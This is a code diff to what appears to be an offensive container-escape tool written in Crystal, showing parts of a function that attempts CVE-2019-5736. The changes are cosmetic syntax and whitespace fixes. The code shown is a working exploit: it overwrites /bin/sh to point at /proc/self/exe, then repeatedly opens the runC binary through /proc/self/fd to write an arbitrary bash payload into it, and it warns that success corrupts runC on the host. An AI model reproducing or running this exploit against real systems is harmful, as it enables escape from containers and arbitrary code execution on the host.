@@ -1,11 +1,11 @@
 
 def attempt_cve_2019_5736(user_payload : String)
-    payload = "#!/bin/bash \n #{user_payload}" 
+    payload = "#!/bin/bash \n #{user_payload}"
     puts("==== ATTEMPTING CVE-2019-5736 ====")
     puts("=> WARNING: If successful this exploit will corrupt runC on the host OS.")
     puts("• Setting up /bin/sh to point to our payload.")
-    begin 
-        binsh = File.new("/bin/sh", mode= "w", perm= 0o777)
+    begin
+        binsh = File.new("/bin/sh", mode: "w", perm: 0o777)
         binsh.puts("#!/proc/self/exe")
         binsh.close()
         puts("•  Finished overwriting /bin/sh")
@@ -39,10 +39,10 @@ def attempt_cve_2019_5736(user_payload : String)
     fd1 = 0
     while fd1 ==0
         begin
-            runc_file = File.open("/proc/self/fd/#{fd}",mode= "w", perm= 0o700)
+            runc_file = File.open("/proc/self/fd/#{fd}",mode: "w", perm: 0o700)
             fd1 = runc_file.fd
             runc_file.puts(payload)
-            runc_file.close()            
+            runc_file.close()
         rescue ex : Exception
         end
     end
